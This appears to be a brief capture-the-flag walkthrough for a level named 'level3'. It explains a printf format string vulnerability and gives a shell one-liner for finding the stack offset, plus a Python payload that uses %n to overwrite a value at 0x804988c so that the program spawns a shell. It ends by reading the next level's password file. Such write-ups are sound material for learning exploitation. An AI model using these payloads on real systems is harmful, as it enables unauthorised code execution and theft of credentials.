Format string exploit

We can see in the dump a call of printf.

With some test, we see that our input is the format string of printf.

Example:

With a "%x %x", we can see a dump of the first 2 bytes.

We are going to use the exploit format string.

calculate the offset:

EXEC=level3; python -c 'print "AAAA " + "%x " * 99  ' > /tmp/t1 && cat /tmp/t1 - | ./$EXEC > /tmp/t2 | awk -F "41414141" '{print $1}' <<< cat /tmp/t2 > /tmp/t3 && echo "Offset = " &&  awk '{print gsub("[ ]",""+1); exit}' <<< cat /tmp/t3 && rm -rf /tmp/t1 /tmp/t2 /tmp/t3

Offset =
4

In the dump, we can see in the v function a cmp between eax and 0x40 (64), which will call system("/bin/sh")

The value insert in eax is at the address 0x804988c

We will write 64 at this address

python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d" + "%4$n"' > /tmp/ex3 && cat /tmp/ex3 - | ./level3

cat /home/user/level4/.pass
